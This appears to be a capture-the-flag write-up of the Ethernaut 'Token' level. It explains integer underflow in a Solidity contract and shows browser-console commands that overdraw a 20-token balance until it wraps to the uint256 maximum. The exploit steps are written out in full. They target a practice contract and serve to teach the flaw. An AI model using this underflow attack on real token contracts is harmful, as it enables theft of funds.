# Level 5: Token

### Wargame

The goal of this level is for you to hack the basic token contract below.
You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:
* What is an odometer?

### Key Insights
* Integer Overflow

Under integer overflow, a `uint256` value, upon exceeding its maximum capacity (2^256 - 1), wraps around to 0 or a small positive number. Conversely, integer underflow occurs when a `uint256` value drops below 0, causing it to wrap around to its maximum possible value.

### Attack Steps
On the Ethernaut web page, enter the develp tool console. 
1. check my balance on this contract.
    ```bash
    > mybalance = await contract.balanceOf(player)
    > mybalance.toString()
    '20'

    > total = await contract.totalSupply()
    > total.toString()
    '21000000'
    ```

2. We now use a normal transfer command. We'll see the balance after this transfer.
    ```bash
    > await contract.transfer(0, 1)
    > mybalance = await contract.balanceOf(player)
    > mybalance.toString()
    '19'
    ```

3. We are now using a special transfer amount to attack this contract. You may notice that this amount exceeds my current balance.
 Once the transfer is complete, I will have a significant number of tokens. Now, I'm a super rich man!!
    ```bash
    > await contract.transfer(instance, 20)
    > mybalance = await contract.balanceOf(player)
    > mybalance.toString()
    '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    ```
